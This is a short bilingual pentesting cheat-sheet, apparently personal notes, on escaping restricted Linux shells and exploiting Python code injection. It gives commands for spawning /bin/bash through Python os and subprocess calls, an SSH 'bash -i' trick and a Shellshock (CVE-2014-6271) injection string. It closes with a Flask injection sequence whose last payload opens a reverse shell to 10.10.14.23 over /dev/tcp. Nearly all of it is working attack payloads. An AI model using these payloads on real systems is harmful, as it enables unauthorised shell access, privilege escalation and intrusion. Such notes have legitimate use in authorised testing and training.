
# 受限 shell 逃逸  (Restricted Shell Bypass)
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
**Check for operators  ( > , >> , < , | ) .**
```shell
echo 123 > 123
```

**Check for available programming language** 
```python
import re
```

**Check sudo -l**
```bash
sudo -l
```

**Check env.**
```bash
echo $SHELL
echo $0 (当前文件名,路径)
ls $PATH
```

#### 0x01 Python :
```python
如果使用py写的脚本 ，那就有可能包含这两个模块 ，可以看一下这两个模块的命令是怎么执行的
import os
import subprocess
```

```python
subprocess.run()
subprocess.call()
subprocess.popen()
os.system()
os.popen()
```

```shell
ls system("whoami")
ls run("whoami")
```

**Bypass**
```shell
ls os.system("/bin/bash")
```

#### 0x02 ssh  / EXPLOITS
```
ssh root@192.168.55.17 'bash -i'
```
**OpenSSH 5.9p1 ： shellshock (CVE-2014-6271)**
```shell
sudo ssh -i ./noob noob@192.168.55.20 -o PubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss "() { :;}; whoami"
```


# Python 本地 POC 绕过注入点
**Flask 框架**
```
query=test
query=test' (加单引号报错 或无回显)
query=test' ' (闭合后又重新回显 证明中间可以被插入代码)
query=test'%2b __import__('os').popen('id').read()+%2b'      (%2b为 + )
query=test'%2b __import__('os').popen('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.23/2233+0>%261"').read()+%2b'
(Rev Shell Payload)
```

